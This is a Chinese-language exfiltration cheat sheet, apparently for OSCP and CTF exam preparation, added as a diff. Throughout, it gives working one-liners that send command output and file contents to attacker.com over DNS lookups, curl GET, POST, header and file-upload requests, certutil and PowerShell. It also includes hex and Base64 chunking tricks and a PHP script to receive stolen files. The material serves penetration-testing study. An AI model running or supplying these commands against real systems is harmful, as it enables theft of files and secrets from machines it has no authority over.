@@ -1,0 +1,123 @@
+一、DNS 外带命令
+DNS 外带的优势是几乎不被防火墙拦截，因为绝大多数网络都需要解析域名。
+
+⚠️ 关键前提：DNS 查询只允许字母、数字和连字符 -，不允许空格和特殊字符。所以外带前必须编码（Hex 或 Base32），否则命令会截断报错！另外，单次 DNS 标签长度不能超过 63 个字符。
+
+1. 简单测试（确认出站 DNS 是否通）
+使用你自己的 VPS 或公共 DNS 平台（如 dnslog.cn、ceye.io、burp collaborator）：
+
+
+# Linux
+nslookup whoami.attacker.com
+dig whoami.attacker.com
+host whoami.attacker.com
+
+# Windows
+nslookup whoami.attacker.com
+2. 带回显的命令执行（单行短数据）
+将命令结果拼接为子域名：
+
+
+# Linux
+nslookup `whoami`.attacker.com
+nslookup `hostname -I`.attacker.com
+
+# Windows
+nslookup %USERNAME%.attacker.com
+3. 读取文件并进行 Hex 编码外带（最常用！）
+这是最稳健的方法。用 xxd 把文件转成纯十六进制，用 fold 切割成小段（避免超长域名被截断），循环发送：
+
+
+# 读取 /etc/flag 并外带
+cat /etc/flag | xxd -p | tr -d '\n' | fold -w 30 | while read line; do nslookup $line.attacker.com; done
+原理解析：
+
+xxd -p：将文件转为纯十六进制（无空格换行）。
+tr -d '\n'：删除可能存在的换行符。
+fold -w 30：每 30 个字符切断为一行（保证子域名不超过 63 字符限制）。
+while read line; do ... done：逐行拼接到域名前发送。
+接收端还原：你在自己的 DNS 服务器上抓到如 636174636d65.attacker.com，去掉后缀，用 xxd 还原：
+
+
+echo "636174636d65" | xxd -r -p
+二、Curl 外带命令
+如果目标允许出站 HTTP/HTTPS，Curl 是最强大最方便的工具，支持 POST 和上传文件，不用担心特殊字符和空格问题。
+
+1. 简单测试（确认出站 HTTP 是否通）
+在自己的 VPS 上起一个监听：python3 -m http.server 80 或 nc -lvnp 80
+
+
+curl http://attacker.com/test
+2. GET 请求外带（短数据）
+将命令结果拼接到 URL 参数中：
+
+
+# 使用反引号
+curl http://attacker.com/?data=`whoami`
+
+# 使用 $()
+curl http://attacker.com/?data=$(cat /etc/flag)
+⚠️ 问题：如果命令结果包含空格、&、# 等特殊字符，URL 会被截断。所以强烈建议加 Base64 编码：
+
+
+# -w 0 确保不换行
+curl http://attacker.com/?data=$(cat /etc/flag | base64 -w 0)
+3. POST 请求外带（长数据、绕过 URL 长度限制）
+使用 -d 发送 POST 请求，数据在 Body 里，不怕长度限制和特殊字符：
+
+
+# 直接 POST 文件内容
+curl -X POST http://attacker.com -d "$(cat /etc/flag)"
+
+# Base64 编码后 POST（最推荐，避免乱码和特殊字符破坏请求格式）
+curl -X POST http://attacker.com -d "$(cat /etc/flag | base64 -w 0)"
+4. 通过 HTTP 头部外带
+有些场景参数在 Body 里会被过滤，可以藏在 Header 里：
+
+
+curl http://attacker.com -H "X-Data: $(cat /etc/flag | base64 -w 0)"
+5. 直接上传文件（最优雅！）
+如果目标有 Curl，最完美的外带方式是直接把文件当成 POST 数据上传：
+
+
+# 上传文件
+curl -X POST http://attacker.com -F "file=@/etc/flag"
+接收端（VPS）写个简单 PHP 脚本保存文件：
+
+
+<?php
+move_uploaded_file($_FILES['file']['tmp_name'], './stolen_flag.txt');
+?>
+三、Windows 环境下的外带补充
+OSCP 也会遇到 Windows 靶机，Windows 没有 xxd 和 curl（老版本），需要用其他命令：
+
+1. Windows CMD 外带
+
+:: GET 外带
+curl http://attacker.com/?data=%USERNAME%
+
+:: 如果没有 curl，用 certutil（常用于下载，但也能触发带参数的请求）
+certutil -urlcache -split -f http://attacker.com/?data=%USERNAME%
+
+:: 读取文件并 base64 编码外带（PowerShell 更好）
+2. Windows PowerShell 外带
+PowerShell 极其强大，一行代码实现 POST 外带：
+
+
+# POST 外带文件
+Invoke-WebRequest -Uri http://attacker.com -Method POST -Body ([System.IO.File]::ReadAllText("C:\flag.txt"))
+
+# Base64 编码外带
+$data = [Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\flag.txt"))
+Invoke-WebRequest -Uri "http://attacker.com/?data=$data"
+📌 总结与考试建议
+场景	推荐命令	优点	注意事项
+DNS 无回显	xxd -p \... | fold -w 30 | while read line; do nslookup $line.a.com; done	绕过严格 TCP 出站限制	必须编码，单标签<63字符
+HTTP 短数据	curl http://a.com/?d=$(whoami|base64)	简单直接	URL 有长度限制，需 Base64
+HTTP 长数据	curl -X POST http://a.com -d "$(cat /flag|base64)"	无长度限制，不怕特殊字符	需要目标支持出站 HTTP
+HTTP 传文件	curl -F "file=@/flag" http://a.com	最优雅，原封不动传文件	需接收端支持文件接收
+OSCP 黄金法则：
+
+先测通不通：不管 DNS 还是 HTTP，先 nslookup 或 curl 一个简单字符串，看 VPS 有没有收到。
+永远加 Base64：base64 -w 0 是你最好的朋友，能解决 99% 的特殊字符导致的外带失败问题。
+URL 编码：如果非要把数据放在 GET 参数里，记得用 --data-urlencode：curl -G http://a.com --data-urlencode "data=$(cat /flag)"。
